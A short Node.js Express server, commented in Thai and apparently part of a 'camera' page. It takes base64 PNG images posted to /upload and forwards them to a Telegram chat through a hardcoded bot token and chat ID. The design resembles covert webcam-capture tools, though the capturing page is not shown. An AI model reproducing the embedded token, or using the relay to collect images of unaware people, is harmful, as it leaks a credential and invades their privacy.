const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;

// ✅ ใส่ข้อมูลจริงของคุณตรงนี้
const TELEGRAM_TOKEN = '7819014286:AAECmM6-QjOYAXraDynowG-morHswzWtIUM';
const CHAT_ID = '-4973238132';

app.use(express.json({ limit: '10mb' }));
app.use(express.static(__dirname));

app.post('/upload', async (req, res) => {
  try {
    const base64 = req.body.image.replace(/^data:image\/png;base64,/, '');
    const filename = `tmp_${Date.now()}.png`;
    const filepath = path.join(__dirname, filename);
    fs.writeFileSync(filepath, base64, 'base64');

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', fs.createReadStream(filepath));

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, form, {
      headers: form.getHeaders()
    });

    fs.unlinkSync(filepath);
    res.sendStatus(200);
  } catch (error) {
    console.error('❌ ส่งไม่สำเร็จ:', error.response?.data || error.message);
    res.sendStatus(500);
  }
});

app.listen(PORT, () => {
  console.log(`✅ Server กล้องทำงานที่ http://localhost:${PORT}`);
});
